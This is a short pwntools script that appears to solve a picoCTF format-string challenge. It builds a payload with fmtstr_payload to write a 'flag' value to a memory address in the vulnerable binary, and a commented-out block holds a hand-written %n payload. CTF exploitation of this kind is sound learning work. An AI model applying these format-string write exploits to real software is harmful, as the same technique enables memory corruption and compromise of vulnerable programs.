from pwn import *
"""
r = remote('rhea.picoctf.net',58356)
s = r.recvuntil('say?')
#the first bytes are 0x6761 = 26465 (note the , after the d)
#need 1285 more characters to get to 0x6c66 = 27750
r.sendline(b'%26464d,%20$hn%1281dAAAA%19$hnx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00DEFGHIJKLMNOPQRSTUVWXYZ')
r.interactive()
"""

# Datos para conectarse remoto
SERVER = 'rhea.picoctf.net'
PORT = 00000

# Datos del binario local
e = ELF("./vuln")
context.binary = './vuln'

DEBUG = True

if DEBUG:
	s = process('./vuln')
else:
	s = remote(SERVER, PORT)

# Response after connection is made
res = s.recvline().decode()
print(res)

# Necessary variables
offset = 14
sus_addr = int('404060', 16)
new_val = int('67616c66', 16)
addresses = {sus_addr:new_val}

# Options of the payload
# Funciona con las opciones de byte y short, con short me da un payload mas corto
payload = fmtstr_payload(offset, addresses, write_size='byte')

print(payload)

s.sendline(payload)
s.interactive()
